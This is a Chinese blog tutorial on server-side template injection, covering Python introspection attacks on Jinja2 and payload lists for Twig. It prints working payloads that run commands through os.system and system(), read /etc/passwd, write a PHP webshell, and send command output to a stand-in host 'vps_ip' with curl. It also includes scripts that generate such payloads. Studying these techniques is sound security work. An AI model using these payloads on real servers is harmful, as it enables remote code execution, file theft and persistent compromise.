@@ -1,0 +1,1485 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SSTI(服务器模板注入), Lees&#39;s Blog">
+    <meta name="description" content="前言官方解释：“模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。”
+模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SSTI(服务器模板注入) | Lees&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Lees's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Lees&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fa fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fa fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fa fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fa fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fa fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fa fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Lees&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            没有目的，就做不成任何事情
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SSTI(服务器模板注入)</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/SSTI/">
+                                <span class="chip bg-color">SSTI</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B3%A8%E5%85%A5/" class="post-category">
+                                注入
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-10-11
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.5k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>官方解释：“模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。”</p>
+<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
+<h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>当前的框架基本上都采用MVC模式。M（模板），V（视图），C（控制器）。用户数据给控制器，控制器将数据交给对应模板处理，最终经过渲染展现给用户。</p>
+<span id="more"></span>
+
+<p>漏洞形成的原因就是服务器接收到用户的恶意数据，未经过处理就经模板处理，破坏模板架构，在渲染过程中执行恶意语句，因而导致信息泄露，代码执行，getshell等。<br><img src="https://bu.dusays.com/2021/10/11/775720513505a.png" alt="各类语言模板引擎"></p>
+<h3 id="对服务器进行指纹识别"><a href="#对服务器进行指纹识别" class="headerlink" title="对服务器进行指纹识别"></a>对服务器进行指纹识别</h3><p>蓝色框包含要测试的注入字符串。如果注射有效，请按照绿色箭头进行操作。如果注射失败，请按照红色箭头进行操作。</p>
+<p><img src="https://bu.dusays.com/2021/10/18/f060f8d40b6d4.png"></p>
+<p>为了进一步利用这个服务器，我们需要浏览 Python 3 的继承层次结构。所以首先，我们将在模板引擎之外检查它。</p>
+<p><img src="https://bu.dusays.com/2021/10/18/a64da58aa32dc.png"></p>
+<p>沿着 Python 层次结构向上移动到顶部的“对象”再，从<strong>object</strong>到**<strong>subclasses</strong><strong>、 <strong>catch_warnings</strong>和</strong><strong>import</strong>** 到达<strong>os.system</strong>，它允许我们执行任意命令。</p>
+<p>catch_warning是捕获与错误处理有关的警告类，它有一个导入方法，比如我可以导入os达到任意执行</p>
+<p><a target="_blank" rel="noopener" href="https://bowneconsultingcontent.com/pub/EH/proj/ED105.htm">Server Side Template Injection</a></p>
+<h2 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h2><p>目前python常见模板引擎有jinjia2、Django、tornado等</p>
+<h3 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h3><p>jinjia2中存在三种语法</p>
+<pre><code>1. &#123;&#123; &#125;&#125; 变量取值
+2. &#123;% %&#125; 控制结构
+3.  注释
+4. \# \# 可以有和&#123;% %&#125;相同的效果
+</code></pre>
+<p>jinjia2的变量<br><img src="https://bu.dusays.com/2021/10/11/e80e411c8e9af.png"><br>我们可以知道变量并不是直接将其直接转为python代码执行，而是只支持变量及其属性元素。也就说对于变量它是直接把它解析成python对象来运行了。<br>既然支持变量的属性、方法调用，那就可以利用一些特殊的属性来进行注入。</p>
+<ul>
+<li><p>__class__<br>获取实例对象的类<br>‘’.__class__   &#x3D;&#x3D;&gt;  &lt;class ‘str’&gt;</p>
+</li>
+<li><p>__mro__<br>获取当前类对象的所有继承类，返回一个tuple，包含了这个类所有继承的基类，顺序就是MRO（Method Resolution Order） 寻找的顺序<br><img src="https://bu.dusays.com/2021/10/15/dc295e01a812e.png"><br>更多可以看这里：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p>
+</li>
+<li><p>__base__<br>返回父类，记住是父类不是基类，只是在python3中字符串的父类是基类而已<br><img src="https://bu.dusays.com/2021/10/15/baa5da0e2266d.png"></p>
+</li>
+<li><p>__subclasses__()<br>返回了类的所有存活的子类的引用。而python中所有的类都是继承于object这个类，所以只要调用object这个类的__subclasses__()方法就可以获取我们想要的类的对象。比如用于读取文件的file对象。</p>
+</li>
+<li><p>__globals__<br>所有的函数都会有一个__globals__属性,它会以一个dict，返回函数所在模块命名空间中的所有变量。<br>例如</p>
+<pre class=" language-python"><code class="language-python">outFuncVar <span class="token operator">=</span> <span class="token number">2</span>
+<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  inFuncVar <span class="token operator">=</span> <span class="token number">1</span>
+  <span class="token keyword">pass</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>__globals__<span class="token punctuation">)</span>
+<span class="token keyword">import</span> os
+<span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>__globals__<span class="token punctuation">)</span>
+</code></pre>
+<p>输出如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>function func at <span class="token number">0x000001A0B8777F28</span><span class="token operator">></span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'outFuncVar': 2, , '__builtins__': &lt;module 'builtins' (built-in)>&amp;#125;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'outFuncVar': 2, , 'os': &lt;module 'os' from 'F:\\Python\\lib\\os.py'>, '__builtins__': &lt;module 'builtins' (built-in)>&amp;#125;</span>
+</code></pre>
+<p>可以看到__globals__中会包括引入了的modules；同时每个python脚本都会自动加载 builtins （内置函数所在的模块）这个模块，而且这个模块包括了很多强大的built-in 函数(内置函数)，例如eval, exec,open,print,orange等等。<br>所以我们只需要从内置变量出发，调用隐藏属性，然后找到任意一个函数，然后查看它的__globals__[‘__builtins __‘]就可以了。而所有的类都有__init__函数，所以我们直接找__init__函数就是了。</p>
+</li>
+</ul>
+<p>更多可以看原文链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/162752.html">Flask jinja2模板注入思路总结</a> （包含payload和脚本）</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#可以用于python2，3，根据自己环境修改了脚本的一些地方，</span>
+<span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
+<span class="token comment" spellcheck="true"># coding=utf-8</span>
+<span class="token comment" spellcheck="true"># python 3.5</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template
+
+<span class="token comment" spellcheck="true"># Some of special names</span>
+cnt<span class="token operator">=</span><span class="token number">0</span>
+searchList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">"__new__"</span><span class="token punctuation">,</span> <span class="token string">'__del__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__bytes__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__bool__'</span><span class="token punctuation">,</span> <span class="token string">'__getattr__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__get__'</span><span class="token punctuation">,</span> <span class="token string">'__set__'</span><span class="token punctuation">,</span> <span class="token string">'__delete__'</span><span class="token punctuation">,</span> <span class="token string">'__call__'</span><span class="token punctuation">,</span> <span class="token string">"__instancecheck__"</span><span class="token punctuation">,</span> <span class="token string">'__subclasscheck__'</span><span class="token punctuation">,</span> <span class="token string">'__len__'</span><span class="token punctuation">,</span> <span class="token string">'__length_hint__'</span><span class="token punctuation">,</span> <span class="token string">'__missing__'</span><span class="token punctuation">,</span><span class="token string">'__getitem__'</span><span class="token punctuation">,</span> <span class="token string">'__setitem__'</span><span class="token punctuation">,</span> <span class="token string">'__iter__'</span><span class="token punctuation">,</span><span class="token string">'__delitem__'</span><span class="token punctuation">,</span> <span class="token string">'__reversed__'</span><span class="token punctuation">,</span> <span class="token string">'__contains__'</span><span class="token punctuation">,</span> <span class="token string">'__add__'</span><span class="token punctuation">,</span> <span class="token string">'__sub__'</span><span class="token punctuation">,</span><span class="token string">'__mul__'</span><span class="token punctuation">]</span>
+neededFunction <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">]</span>
+pay <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"Payload?[1|0]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> index<span class="token punctuation">,</span> i <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;.__class__.__base__.__subclasses__()):</span>
+    <span class="token keyword">for</span> attr <span class="token keyword">in</span> searchList<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>i<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> eval<span class="token punctuation">(</span><span class="token string">'str(i.'</span><span class="token operator">+</span>attr<span class="token operator">+</span><span class="token string">')[1:9]'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'function'</span><span class="token punctuation">:</span>
+                <span class="token keyword">for</span> goal <span class="token keyword">in</span> neededFunction<span class="token punctuation">:</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>eval<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token operator">+</span>goal<span class="token operator">+</span><span class="token string">'" in i.'</span><span class="token operator">+</span>attr<span class="token operator">+</span><span class="token string">'.__globals__["__builtins__"].keys()'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        <span class="token keyword">if</span> pay <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+                            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> i<span class="token punctuation">.</span>__name__<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span> attr<span class="token punctuation">,</span> goal<span class="token punctuation">)</span>
+                        <span class="token keyword">else</span><span class="token punctuation">:</span>
+                            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span><span class="token string">": &amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__=='"</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>__name__ <span class="token operator">+</span> <span class="token string">"' %&amp;#125;&amp;#123;&amp;#123; c."</span> <span class="token operator">+</span> attr <span class="token operator">+</span> <span class="token string">".__globals__['__builtins__']['"</span> <span class="token operator">+</span> goal <span class="token operator">+</span> <span class="token string">"'](\"__import__('os').system('whoami')\") &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;"</span><span class="token punctuation">)</span>
+    cnt<span class="token operator">+=</span><span class="token number">1</span>
+
+<span class="token comment" spellcheck="true">#[].__class__.__base__.__subclasses__()[471].__init__.__globals__['__builtins__']['exec']("__import__('os').system('whoami')")</span>
+</code></pre>
+<ul>
+<li><p>__builtins__</p>
+<p>每个python脚本都会自动加载 builtins 这个模块，而且这个模块包括了很多强大的built-in 函数，例如eval, exec, open等等。</p>
+<p>python3:</p>
+</li>
+</ul>
+<pre class=" language-python"><code class="language-python">cnt<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">"catch_warnings"</span><span class="token punctuation">:</span>
+<span class="token comment" spellcheck="true">#        c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span>
+        cnt<span class="token operator">+=</span><span class="token number">1</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        cnt<span class="token operator">+=</span><span class="token number">1</span>
+
+例：<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">146</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span>
+</code></pre>
+<p>python2:</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span>
+</code></pre>
+<ul>
+<li>config.item()<pre><code>&#123;&#123; config.item() &#125;&#125;  可以获取一些配置信息
+</code></pre>
+</li>
+</ul>
+<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>在模板里过滤器相当于一个函数，变量通过过滤器处理后返回，语法<code>&#123;&#123; 变量 | 过滤器 &#125;&#125;</code></p>
+<p>原文介绍</p>
+<pre><code>变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。
+
+看看例z
+&#123;&#123;my_variable|default('my_variable is not defined')&#125;&#125;
+
+ my_variable 为变量，default为过滤器,my_variable is not defined是过滤器的参数。default过滤器的含义是：判断被转换的变量是否被定义过，如果没有被定义，则用字符串参数替换被转换的变量。
+</code></pre>
+<p>在ssti里常用的是attr过滤器，更多的过滤器可以去这里了解下<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44737646/article/details/104279561">jinja2-模板过滤器</a></p>
+<h4 id="命令执行注入"><a href="#命令执行注入" class="headerlink" title="命令执行注入"></a>命令执行注入</h4><p>在object的所有子类中找可以引入了os模块的类，并以此来执行命令</p>
+<pre class=" language-python"><code class="language-python">cnt <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true">#print item</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span> 
+        <span class="token keyword">if</span> <span class="token string">'os'</span> <span class="token keyword">in</span> item<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> item<span class="token punctuation">)</span>
+        cnt<span class="token operator">+=</span><span class="token number">1</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        cnt<span class="token operator">+=</span><span class="token number">1</span>
+        <span class="token keyword">continue</span>
+</code></pre>
+<p>payload：</p>
+<pre><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os'].system('ls > tt.txt & cat tt.txt | xargs -I &#123;&#125; curl http://vps_ip/?&#123;&#125;')&#125;&#125;
+
+这里用到了xargs来传递管道参数，xargs的一个选项-I，使用-I指定一个替换字符串&#123;&#125;，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次（注：xargs的详细用法见http://man.linuxde.net/xargs）
+</code></pre>
+<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><pre class=" language-python"><code class="language-python">cnt <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true">#print item</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token string">"file"</span> <span class="token keyword">in</span> str<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> item<span class="token punctuation">)</span>
+        cnt<span class="token operator">+=</span><span class="token number">1</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        cnt<span class="token operator">+=</span><span class="token number">1</span>
+        <span class="token keyword">continue</span>
+</code></pre>
+<p>找到有读文件功能的类，比如说在40下标有个’file’类<br>payload：</p>
+<pre><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[40](&#39;/etc/passwd&#39;).read()
+</code></pre>
+<p>需要注意的一个点：python3已经移除了file。所以利用file子类文件读取只能在python2中用。</p>
+<p>文章：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/">关于python魔术方法payload：””.__class__.__mro__[2].__subclasses__()<a href="%22/etc/passwd%22">40</a>.read() 的解释</a></p>
+<p><a target="_blank" rel="noopener" href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses</a></p>
+<p><a target="_blank" rel="noopener" href="https://dar1in9s.github.io/2020/09/15/ssti%E8%BF%9B%E9%98%B6/">进阶bypass学习</a></p>
+<h2 id="php-ssti"><a href="#php-ssti" class="headerlink" title="php ssti"></a>php ssti</h2><p>目前常见的php模板引擎有Twig、smarty、blade等</p>
+<h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>
+<p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env，env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache() 方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置，所以</p>
+<p>模板的攻击手法都差不多</p>
+<pre><code>&#123;&#123;'/etc/passwd'|file_excerpt(1,30)&#125;&#125;
+
+&#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125;
+
+&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;
+
+&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;
+
+&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;
+
+&#123;&#123;["id"]|map("system")|join(",")
+
+&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;
+
+&#123;&#123;["id",0]|sort("system")|join(",")&#125;&#125;
+
+&#123;&#123;["id"]|filter("system")|join(",")&#125;&#125;
+
+&#123;&#123;[0,0]|reduce("system","id")|join(",")&#125;&#125;
+
+&#123;&#123;['cat /etc/passwd']|filter('system')&#125;&#125;
+</code></pre>
+<p>具体可以看这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518">TWIG 全版本 通用 SSTI payload</a></p>
